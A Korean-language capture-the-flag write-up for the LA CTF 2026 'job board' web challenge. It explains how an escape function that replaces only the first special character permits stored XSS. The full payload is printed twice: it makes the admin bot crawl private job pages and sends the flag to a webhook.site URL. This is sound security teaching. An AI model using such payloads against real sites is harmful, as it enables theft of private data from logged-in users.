@@ -1,0 +1,148 @@
+---
+title: "LA CTF 2026 | job board"
+date: 2026-02-10 01:00:00 +0900
+categories: [LA CTF 2026, Web]
+tags: [Web]
+toc: true
+comments: false
+---
+
+# job-board
+
+## TL;DR
+Job Board는 지원서(application) 페이지에서 사용자 입력(why)을 HTML로 렌더링할 때 escape를 하지만, 
+`htmlEscape()`가 `replace()`를 전역 치환(`/g`) 없이 사용해서 **각 특수문자를 1번만 escape**한다.  
+그래서 입력 앞에 `&<>` 같은 “미끼”로 1회 escape를 소모시키고, 그 뒤에 `<script>`를 넣으면 **Stored XSS**가 된다.
+
+Admin Recruiter 봇은 admin으로 로그인한 후 지원서 URL을 방문한다. 이때 XSS가 admin 세션에서 실행되므로,
+`/`에서 job 목록(비공개 포함)을 긁고 `/job/<uuid>`들을 순회하며 `lactf{...}`를 찾아 **webhook으로 exfil**하면 플래그를 얻는다.
+
+---
+
+## Overview
+`job-board`는 구인 공고를 보여주고 지원서를 제출하는 웹 서비스다.
+
+- 일반 사용자: public job만 확인 가능
+- Admin Recruiter: public + private job 확인 가능  
+- private job 설명(description)에 플래그가 포함됨  
+- “지원서를 Admin Recruiter에게 보내라” → 봇이 URL을 열어봄
+
+핵심은 **지원서 내용(why)이 저장되고 `/application/<id>`에서 렌더링**된다는 점이며, 여기서 Stored XSS가 가능하다.
+
+---
+
+## Solution
+
+### 1) Recon
+`app.js`를 보면 라우팅 구조가 단순하다.
+
+- `GET /` : job 목록(리쿠르터면 private 포함)
+- `GET /job/:id` : job 상세
+- `POST /application/:id` : 지원서 제출(이때 why 저장)
+- `GET /application/:id` : 지원서 조회(여기서 why 렌더링)
+- `POST /login` : 로그인(봇이 수행)
+
+또한 초기 job 생성에서 private job 설명에 FLAG가 들어간다.
+
+---
+
+### 2) Root cause
+취약점은 escape 함수 구현 실수다.
+
+```js
+function htmlEscape(s, quote=true) {
+  s = s.replace("&", "&amp;");
+  s = s.replace("<", "&lt;");
+  s = s.replace(">", "&gt;");
+  if (quote) {
+    s = s.replace('"', "&quot;");
+    s = s.replace('\'', "&#x27;");
+  }
+  return s;
+}
+```
+
+문제점:
+- `replace()`가 전역 치환이 아니라 **각 문자 1회만 치환**
+- 즉 입력에 `<`가 2번 이상 등장하면 첫 `<`만 `&lt;`로 바뀌고, 다음 `<`는 그대로 남아 **태그 삽입** 가능
+- `>`도 동일하게 1회만 escape되므로, **앞부분에 `&<>` 같은 미끼를 둬서 1회 escape를 소모**한 뒤 진짜 `<script>`를 두면 XSS가 안정적으로 성립
+
+---
+
+### 3) Exploit
+목표: admin만 볼 수 있는 private job에서 플래그 추출
+
+공격 흐름:
+1) why 필드에 Stored XSS payload 주입
+2) application URL을 Admin Recruiter에게 전달
+3) 봇이 admin으로 로그인한 상태에서 application 페이지 방문 → JS 실행
+4) JS가 `/`를 fetch하여 job 링크(`/job/<uuid>`) 수집  
+   - admin이므로 private job 링크까지 포함될 수 있음
+5) 각 job 상세를 fetch하고 `lactf{...}` 정규식으로 플래그 탐색
+6) 찾으면 webhook으로 전송(페이지 이동 없이 `new Image().src`로 exfil)
+
+**Payload (why 필드에 삽입):**
+```html
+&<> <script>(async()=>{
+  const home = await (await fetch(`/`)).text();
+  const links = home.match(/\/job\/[0-9a-f-]{36}/g) || [];
+  for (const u of links){
+    const t = await (await fetch(u)).text();
+    const m = t.match(/lactf\{[^}]+\}/);
+    if(m){
+      (new Image()).src = `https://webhook.site/b8162ed9-ac6f-4ce1-aec8-7aed9ffef07c?f=${encodeURIComponent(m[0])}`;
+      break;
+    }
+  }
+})();</script>
+```
+
+포인트:
+- 앞의 `&<>`는 escape 1회 소모용 “미끼”
+- 문자열은 백틱(`)을 사용해 `'`/`"` escape에 덜 민감
+- exfil은 `location` 대신 `new Image().src`가 봇 환경에서 더 안정적
+
+---
+
+### 4) Flag
+webhook에서 `f` 파라미터로 플래그가 수신됨:
+
+---
+
+## Solver
+
+### 1) Exploit Payload
+```html
+&<> <script>(async()=>{
+  const home = await (await fetch(`/`)).text();
+  const links = home.match(/\/job\/[0-9a-f-]{36}/g) || [];
+  for (const u of links){
+    const t = await (await fetch(u)).text();
+    const m = t.match(/lactf\{[^}]+\}/);
+    if(m){
+      (new Image()).src = `https://webhook.site/b8162ed9-ac6f-4ce1-aec8-7aed9ffef07c?f=${encodeURIComponent(m[0])}`;
+      break;
+    }
+  }
+})();</script>
+```
+
+### 2) Request (자동화)
+- `/`에서 public job 하나를 골라 ID를 추출
+- `POST /application/<jobid>`로 지원서 제출
+- 응답 HTML에서 `/application/<uuid>`를 추출해 절대 URL 출력
+- 그 URL을 대회 페이지에서 Admin Recruiter에게 제출
+
+### 3) Result
+Admin 봇이 application URL을 열면 Stored XSS가 admin 컨텍스트에서 실행되어 private job의 플래그를 읽고 webhook으로 전송한다.
+
+**Flag:** `lactf{c0ngr4ts_0n_y0ur_n3w_l7fe}`
+
+---
+
+## solve.py
+```bash
+python3 solve.py \
+  --base "<INSTANCE URL>" \
+  --webhook "<WEBHOOK URL>"
+```
